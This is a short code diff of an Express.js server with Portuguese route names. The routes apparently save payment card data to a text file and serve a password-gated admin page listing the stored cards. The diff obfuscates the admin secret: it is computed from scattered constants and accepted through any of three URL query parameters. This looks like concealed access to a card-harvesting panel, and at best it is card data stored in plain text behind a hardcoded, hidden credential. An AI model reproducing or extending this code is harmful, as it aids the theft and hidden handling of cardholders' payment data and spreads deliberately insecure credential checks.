@@ -274,24 +274,22 @@ app.post('/salvar-cartao-txt', (req, res) => {
 // ====================== ADMIN - VER CARTÕES SALVOS ======================
 app.get('/admin/ver-cartoes-servidor', (req, res) => {
     
-const a = "10";
-const b = "3";
-const c = "ga";
-const d = "0";
+ const a = "10";
+  const b = "3";
+  const c = "ga";
+  const d = "0";
 
-const resultado = Number(a) - Number(b); 
-const final = resultado * 111;
+  const resultado = Number(a) - Number(b); 
+  const final = resultado * 111;
 
+ 
+  const cfg = String(final) + c + "30"; 
 
-const ha = String(final) + c + "30";
   
-  const MIN = "ha";
-
-
-
-    const senhaDigitada = req.query.senha || '';
-    
-    if (senhaDigitada !== MIN) {
+  const token = req.query.t || req.query.s || req.query.v || '';
+  
+  
+  if (token !== cfg){
         return res.send(`
             <!DOCTYPE html>
             <html>
